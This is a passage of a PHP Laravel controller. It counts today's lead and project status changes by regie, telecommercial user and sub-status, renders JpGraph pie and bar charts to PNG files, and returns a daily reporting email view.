                        $count = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'lead')->where('status_type', 'main')->where('to_id', 5)->where('regie_id', $regie->id)->count();
                        if($count > 0){
                            $section_ko_regie_data[] = $count;
                            $section_ko_regie_legends[] = $regie->name;
                        }
                    } 
                    if(count($section_ko_regie_data) > 0){
                        $section_ko_regie = new Graph\PieGraph(900,600);
                        $section_ko_regie->SetShadow();
                        
                        $section_ko_regie_p1 = new Plot\PiePlot($section_ko_regie_data);
                        $section_ko_regie_p1->SetLegends($section_ko_regie_legends);
                        $section_ko_regie_p1->SetSize(0.25);
                        $section_ko_regie_p1->SetCenter(0.5);
                        
                        $section_ko_regie->Add($section_ko_regie_p1); 
        
                        $gdImgHandler = $section_ko_regie->Stroke(_IMG_HANDLER);
                        $section_ko_regie_file = time()."ko-regie.png";
                        
                        $fileName = $path.'/'.$section_ko_regie_file;
                        $section_ko_regie->img->Stream($fileName); 
                    }else{
                        $section_ko_regie_file = null;
                    } 


                //########## section ko Regie chart End ##########//
                //########## section ko telecommercial chart start ##########// 

                    $section_ko_telecommercial_datay = [];
                    $section_ko_telecommercial_datax = [];

                    foreach($telecommercial_users as $telecommercial_user){
                        $section_ko_telecommercial_datay[] = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'lead')->where('status_type', 'main')->where('to_id', 5)->where('telecommercial_id', $telecommercial_user->id)->count();
                        $section_ko_telecommercial_datax[] = $telecommercial_user->name;
                    }
                    // Setup the graph. 
                    $section_ko_telecommercial = new Graph\Graph(900, 500);
                    $section_ko_telecommercial->img->SetMargin(60, 20, 35, 75);
                    $section_ko_telecommercial->SetScale('textlin');
                    $section_ko_telecommercial->SetMarginColor('lightblue:1.1');
                    $section_ko_telecommercial->SetShadow();
            
                    // Setup font for axis
                    $section_ko_telecommercial->xaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);
                    $section_ko_telecommercial->yaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);

                    // Show 0 label on Y-axis (default is not to show)
                    $section_ko_telecommercial->yscale->ticks->SupressZeroLabel(false);

                    // Setup X-axis labels
                    $section_ko_telecommercial->xaxis->SetTickLabels($section_ko_telecommercial_datax);
                    $section_ko_telecommercial->xaxis->SetLabelAngle(75);

                    // Create the bar pot
                    $section_ko_telecommercial_bplot = new Plot\BarPlot($section_ko_telecommercial_datay);
                    $section_ko_telecommercial_bplot->SetWidth(0.6);

                    // Setup color for gradient fill style
                    $section_ko_telecommercial_bplot->SetFillGradient('navy:0.9', 'navy:1.85', GRAD_LEFT_REFLECTION);

                    // Set color for the frame of each bar
                    $section_ko_telecommercial_bplot->SetColor('white');
                    $section_ko_telecommercial->Add($section_ko_telecommercial_bplot);

                    // Finally generate the image

                    $gdImgHandler = $section_ko_telecommercial->Stroke(_IMG_HANDLER);
                    $section_ko_telecommercial_file = time()."ko-telecomerical.png";
                    
                    $fileName = $path.'/'.$section_ko_telecommercial_file;
                    $section_ko_telecommercial->img->Stream($fileName); 

                //########## section ko telecommercial chart end ##########//

                //########## section ko statut chart start ##########// 

                    $section_ko_statut_datay = [];
                    $section_ko_statut_datax = [];

                    foreach($ko_status->getSubStatus as $ko_statut){
                        $section_ko_statut_datay[] = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'lead')->where('status_type', 'main')->where('to_id', 5)->where('statut_id', $ko_statut->id)->count();
                        $section_ko_statut_datax[] = $ko_statut->name;
                    }
                    // Setup the graph. 
                    $section_ko_statut = new Graph\Graph(900, 500);
                    $section_ko_statut->img->SetMargin(60, 20, 35, 75);
                    $section_ko_statut->SetScale('textlin');
                    $section_ko_statut->SetMarginColor('lightblue:1.1');
                    $section_ko_statut->SetShadow();
            
                    // Setup font for axis
                    $section_ko_statut->xaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);
                    $section_ko_statut->yaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);

                    // Show 0 label on Y-axis (default is not to show)
                    $section_ko_statut->yscale->ticks->SupressZeroLabel(false);

                    // Setup X-axis labels
                    $section_ko_statut->xaxis->SetTickLabels($section_ko_statut_datax);
                    $section_ko_statut->xaxis->SetLabelAngle(75);

                    // Create the bar pot
                    $section_ko_statut_bplot = new Plot\BarPlot($section_ko_statut_datay);
                    $section_ko_statut_bplot->SetWidth(0.6);

                    // Setup color for gradient fill style
                    $section_ko_statut_bplot->SetFillGradient('navy:0.9', 'navy:1.85', GRAD_LEFT_REFLECTION);

                    // Set color for the frame of each bar
                    $section_ko_statut_bplot->SetColor('white');
                    $section_ko_statut->Add($section_ko_statut_bplot);

                    // Finally generate the image

                    $gdImgHandler = $section_ko_statut->Stroke(_IMG_HANDLER);
                    $section_ko_statut_file = time()."ko-statut.png";
                    
                    $fileName = $path.'/'.$section_ko_statut_file;
                    $section_ko_statut->img->Stream($fileName); 

                //########## section ko statut chart end ##########// 
            //########## section ko chart end ##########// 

            //########## chantier section ko chart start ##########// 
            //########## chantier section ko Regie chart start ##########//
                 
            $chantier_section_ko_regie_data = [];
            $chantier_section_ko_regie_legends = [];

            foreach($regies as $regie){
                $count = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'project')->where('status_type', 'main')->where('to_id', 7)->where('regie_id', $regie->id)->count();
                if($count > 0){
                    $chantier_section_ko_regie_data[] = $count;
                    $chantier_section_ko_regie_legends[] = $regie->name;
                }
            }

            if(count($chantier_section_ko_regie_data) > 0){
                $chantier_section_ko_regie = new Graph\PieGraph(900,600);
                $chantier_section_ko_regie->SetShadow();
                
                $chantier_section_ko_regie_p1 = new Plot\PiePlot($chantier_section_ko_regie_data);
                $chantier_section_ko_regie_p1->SetLegends($chantier_section_ko_regie_legends); 
                $chantier_section_ko_regie_p1->SetSize(0.25); 
                $chantier_section_ko_regie_p1->SetCenter(0.5);
                
                $chantier_section_ko_regie->Add($chantier_section_ko_regie_p1); 

                $gdImgHandler = $chantier_section_ko_regie->Stroke(_IMG_HANDLER);
                $chantier_section_ko_regie_file = time()."chantier-ko-regie.png";
                
                $fileName = $path.'/'.$chantier_section_ko_regie_file;
                $chantier_section_ko_regie->img->Stream($fileName); 
            }else{
                $chantier_section_ko_regie_file = null;
            }


        //########## chantier section ko Regie chart End ##########//
        //########## chantier section ko telecommercial chart start ##########// 

            $chantier_section_ko_telecommercial_datay = [];
            $chantier_section_ko_telecommercial_datax = [];

            foreach($telecommercial_users as $telecommercial_user){
                $chantier_section_ko_telecommercial_datay[] = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'project')->where('status_type', 'main')->where('to_id', 7)->where('telecommercial_id', $telecommercial_user->id)->count();
                $chantier_section_ko_telecommercial_datax[] = $telecommercial_user->name;
            }
            // Setup the graph. 
            $chantier_section_ko_telecommercial = new Graph\Graph(900, 500);
            $chantier_section_ko_telecommercial->img->SetMargin(60, 20, 35, 75);
            $chantier_section_ko_telecommercial->SetScale('textlin');
            $chantier_section_ko_telecommercial->SetMarginColor('lightblue:1.1');
            $chantier_section_ko_telecommercial->SetShadow();
    
            // Setup font for axis
            $chantier_section_ko_telecommercial->xaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);
            $chantier_section_ko_telecommercial->yaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);

            // Show 0 label on Y-axis (default is not to show)
            $chantier_section_ko_telecommercial->yscale->ticks->SupressZeroLabel(false);

            // Setup X-axis labels
            $chantier_section_ko_telecommercial->xaxis->SetTickLabels($chantier_section_ko_telecommercial_datax);
            $chantier_section_ko_telecommercial->xaxis->SetLabelAngle(75);

            // Create the bar pot
            $chantier_section_ko_telecommercial_bplot = new Plot\BarPlot($chantier_section_ko_telecommercial_datay);
            $chantier_section_ko_telecommercial_bplot->SetWidth(0.6);

            // Setup color for gradient fill style
            $chantier_section_ko_telecommercial_bplot->SetFillGradient('navy:0.9', 'navy:1.85', GRAD_LEFT_REFLECTION);

            // Set color for the frame of each bar
            $chantier_section_ko_telecommercial_bplot->SetColor('white');
            $chantier_section_ko_telecommercial->Add($chantier_section_ko_telecommercial_bplot);

            // Finally generate the image

            $gdImgHandler = $chantier_section_ko_telecommercial->Stroke(_IMG_HANDLER);
            $chantier_section_ko_telecommercial_file = time()."chantier-ko-telecomerical.png";
            
            $fileName = $path.'/'.$chantier_section_ko_telecommercial_file;
            $chantier_section_ko_telecommercial->img->Stream($fileName); 

        //########## chantier section ko telecommercial chart end ##########//

        //########## chantier section ko statut chart start ##########// 

            $chantier_section_ko_statut_datay = [];
            $chantier_section_ko_statut_datax = [];

            foreach($chantier_ko_status->getSubStatus as $ko_statut){
                $chantier_section_ko_statut_datay[] = StatusChangeLog::whereDate('created_at', \Carbon\Carbon::now()->format('Y-m-d'))->where('type', 'project')->where('status_type', 'main')->where('to_id', 7)->where('statut_id', $ko_statut->id)->count();
                $chantier_section_ko_statut_datax[] = $ko_statut->name;
            }
            // Setup the graph. 
            $chantier_section_ko_statut = new Graph\Graph(900, 500);
            $chantier_section_ko_statut->img->SetMargin(60, 20, 35, 75);
            $chantier_section_ko_statut->SetScale('textlin');
            $chantier_section_ko_statut->SetMarginColor('lightblue:1.1');
            $chantier_section_ko_statut->SetShadow();
    
            // Setup font for axis
            $chantier_section_ko_statut->xaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);
            $chantier_section_ko_statut->yaxis->SetFont(FF_VERDANA, FS_NORMAL, 10);

            // Show 0 label on Y-axis (default is not to show)
            $chantier_section_ko_statut->yscale->ticks->SupressZeroLabel(false);

            // Setup X-axis labels
            $chantier_section_ko_statut->xaxis->SetTickLabels($chantier_section_ko_statut_datax);
            $chantier_section_ko_statut->xaxis->SetLabelAngle(75);

            // Create the bar pot
            $chantier_section_ko_statut_bplot = new Plot\BarPlot($chantier_section_ko_statut_datay);
            $chantier_section_ko_statut_bplot->SetWidth(0.6);

            // Setup color for gradient fill style
            $chantier_section_ko_statut_bplot->SetFillGradient('navy:0.9', 'navy:1.85', GRAD_LEFT_REFLECTION);

            // Set color for the frame of each bar
            $chantier_section_ko_statut_bplot->SetColor('white');
            $chantier_section_ko_statut->Add($chantier_section_ko_statut_bplot);

            // Finally generate the image

            $gdImgHandler = $chantier_section_ko_statut->Stroke(_IMG_HANDLER);
            $chantier_section_ko_statut_file = time()."ko-statut.png";
            
            $fileName = $path.'/'.$chantier_section_ko_statut_file;
            $chantier_section_ko_statut->img->Stream($fileName); 

        //########## chantier section ko statut chart end ##########// 
    //########## chantier section ko chart end ##########// 





        // dd('success'); 
        $chart['section_converti_chart'] = $section_converti_file;
        $chart['section_ko_telecommercial_chart'] = $section_ko_telecommercial_file;
        $chart['section_ko_regie_chart'] = $section_ko_regie_file;
        
        $chart['section_ko_statut_chart'] = $section_ko_statut_file;

        $chart['chantier_section_ko_telecommercial_chart'] = $chantier_section_ko_telecommercial_file;
        $chart['chantier_section_ko_regie_chart'] = $chantier_section_ko_regie_file;
        $chart['chantier_section_ko_statut_chart'] = $chantier_section_ko_statut_file;

        $title = 'Email Title';
        $body = 'Email Body';
        $response = 'Email response'; 
        return view('includes.crm.mail.daily_reporting', compact('title', 'body', 'response', 'chart'));
    }

    // END  
}
